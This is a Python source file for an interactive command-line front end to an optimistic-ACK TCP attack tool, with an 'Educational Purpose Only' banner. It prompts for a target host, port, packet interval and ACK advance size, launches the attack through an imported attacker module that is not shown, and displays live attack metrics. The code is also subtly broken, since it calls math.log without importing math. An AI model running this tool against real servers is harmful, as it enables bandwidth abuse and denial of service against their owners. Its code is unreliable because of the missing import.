import sys
import time
from rich.console import Console
from rich.table import Table
import questionary

from optimistic_ack_attacker import OptimisticACKAttacker, AttackConfig

console = Console()

class AttackCLI:
    def __init__(self):
        self.attacker = None

    def start(self):
        console.print("\n🔥 [bold red]OPTIMISTIC ACK ATTACK TOOL[/bold red] 🔥\n")
        console.print("[bold yellow]⚠️  Educational Purpose Only - Use Responsibly ⚠️\n")

        while True:
            action = self.get_main_action()
            if action == "configure_attack":
                self.configure_and_execute_attack()
            elif action == "exit":
                console.print("\n👋 [cyan]Goodbye![/cyan]\n")
                sys.exit(0)

    def get_main_action(self):
        action = questionary.select(
            "What would you like to do?",
            choices=[
                ("⚔️  Configure & Execute Attack", "configure_attack"),
                ("🚪 Exit", "exit"),
            ]
        ).ask()
        return action

    def configure_and_execute_attack(self):
        console.print("\n[cyan]📋 Configure Attack Parameters:[/cyan]\n")
        config = self.get_attack_config()
        self.execute_attack(config)

    def get_attack_config(self):
        answers = questionary.form(
            targetHost=questionary.text("Target Host:", default="127.0.0.1"),
            targetPort=questionary.text("Target Port:", default="3001"),
            enableTransfer=questionary.confirm("Enable data transfer during attack (recommended for demonstration)?", default=True)
        ).ask()

        # Convert types
        answers["targetPort"] = int(answers["targetPort"])
        answers["enableTransfer"] = bool(answers["enableTransfer"])

        transfer_config = {}
        if answers["enableTransfer"]:
            ttype = questionary.select(
                "Transfer type:",
                choices=[
                    ("📥 File Download (recommended)", "download"),
                    ("📺 HLS Video Streaming", "streaming"),
                ],
                default="download"
            ).ask()
            transfer_config["transferType"] = ttype

            if ttype == "download":
                transfer_config["transferUrl"] = questionary.text("Download URL (leave empty for auto):", default="").ask()
            else:
                transfer_config["streamId"] = questionary.text("Stream ID:", default="sample-stream").ask()
            transfer_config["measureSpeed"] = questionary.confirm("Measure speed improvement (baseline vs attack)?", default=True).ask()
        else:
            transfer_config["transferType"] = None
            transfer_config["measureSpeed"] = False

        default_duration = 120 if transfer_config.get("transferType") == "streaming" else 60
        default_interval = 25 if transfer_config.get("transferType") == "streaming" else 50
        default_ack_advance = 17520 if transfer_config.get("transferType") == "streaming" else 8760
        default_scale = 3.0 if transfer_config.get("transferType") == "streaming" else 2.0

        attack_duration = int(questionary.text("Attack Duration (seconds):", default=str(default_duration)).ask())
        packet_interval = int(questionary.text("Packet Interval (ms):", default=str(default_interval)).ask())
        ack_advance_size = int(questionary.text("ACK Advance Size (bytes):", default=str(default_ack_advance)).ask())
        window_scale = float(questionary.text("Window Scale Factor:", default=str(default_scale)).ask())

        return AttackConfig(
            target_host=answers["targetHost"],
            target_port=answers["targetPort"],
            attack_duration=attack_duration,
            packet_interval=packet_interval,
            ack_advance_size=ack_advance_size,
            window_scale=window_scale,
            **transfer_config
        )

    def execute_attack(self, config):
        try:
            self.attacker = OptimisticACKAttacker(config)
            # Setup interrupt handler
            import signal
            def sigint_handler(sig, frame):
                console.print("\n⏹️  [yellow]Attack interrupted by user[/yellow]")
                self.stop_attack()
            signal.signal(signal.SIGINT, sigint_handler)

            console.print("\n[green]▶️  Starting attack...[/green]\n")
            import threading
            metrics_thread = threading.Thread(target=self.display_real_time_metrics)
            metrics_thread.daemon = True
            metrics_thread.start()
            self.attacker.execute_attack()
            # Wait for attack to complete
            while self.attacker.is_active():
                time.sleep(0.5)
            self.display_final_results()
        except Exception as e:
            console.print("\n❌ [red]Attack failed:[/red]", e)
        finally:
            self.attacker = None

    def display_real_time_metrics(self):
        while self.attacker and self.attacker.is_active():
            metrics = self.attacker.get_metrics()
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Attack Metric")
            table.add_column("Value")

            transfer_type = getattr(self.attacker, "transfer_type", "unknown")
            transfer_icon = "📺" if transfer_type == "streaming" else "📥"
            transfer_label = "STREAMING" if transfer_type == "streaming" else "DOWNLOADING"

            table.add_row("Status", f"{transfer_icon} {transfer_label}" if metrics.get("transferActive") else "IDLE")
            table.add_row("Packets Sent", str(metrics.get("packetsPressed", 0)))
            table.add_row("Successful ACKs", str(metrics.get("successfulAcks", 0)))
            table.add_row("Data Transferred", self.format_bytes(metrics.get("totalDataTransferred", 0)))
            table.add_row("Current Speed", self.format_speed(metrics.get("currentSpeed", 0.0)))
            table.add_row("Attacker Connection", "✅ ESTABLISHED" if metrics.get("connectionEstablished") else "❌ DISCONNECTED")
            # Add more as needed

            console.clear()
            console.print("[bold red]🔥 OPTIMISTIC ACK ATTACK - LIVE METRICS 🔥[/bold red]\n")
            console.print(table)
            console.print("\n[grey]Press Ctrl+C to stop the attack[/grey]\n")
            time.sleep(2)

    def display_final_results(self):
        if not self.attacker:
            return
        metrics = self.attacker.get_metrics()
        duration = (time.time() - metrics.get("attackStartTime", time.time()))  # Replace with real duration if tracked

        results_table = Table(show_header=True, header_style="bold magenta")
        results_table.add_column("Metric")
        results_table.add_column("Value")
        results_table.add_row("Total Duration", f"{duration:.1f} seconds")
        results_table.add_row("Packets Sent", str(metrics.get("packetsPressed", 0)))
        try:
            pct = (metrics.get("successfulAcks", 0) / metrics.get("packetsPressed", 1)) * 100
        except ZeroDivisionError:
            pct = 0.0
        results_table.add_row("Success Rate", f"{pct:.1f}%")
        results_table.add_row("Data Transferred", self.format_bytes(metrics.get("totalDataTransferred", 0)))
        results_table.add_row("Ack Loop Speed", self.format_speed(metrics.get("currentSpeed", 0.0)))
        # Add more as needed

        console.print("\n[cyan]📊 FINAL ATTACK RESULTS:[/cyan]\n")
        console.print(results_table)

    def format_bytes(self, bytes_num):
        if bytes_num == 0:
            return "0 B"
        k = 1024
        sizes = ['B', 'KB', 'MB', 'GB']
        i = int((bytes_num and (bytes_num > 0)) and (math.log(bytes_num) / math.log(k)) or 0)
        return f"{(bytes_num / pow(k, i)):.2f} {sizes[i]}"

    def format_speed(self, bytes_per_second):
        return self.format_bytes(bytes_per_second) + "/s"

    def stop_attack(self):
        if self.attacker:
            self.attacker.stop_attack()
            self.display_final_results()
            sys.exit(0)

if __name__ == "__main__":
    cli = AttackCLI()
    cli.start()
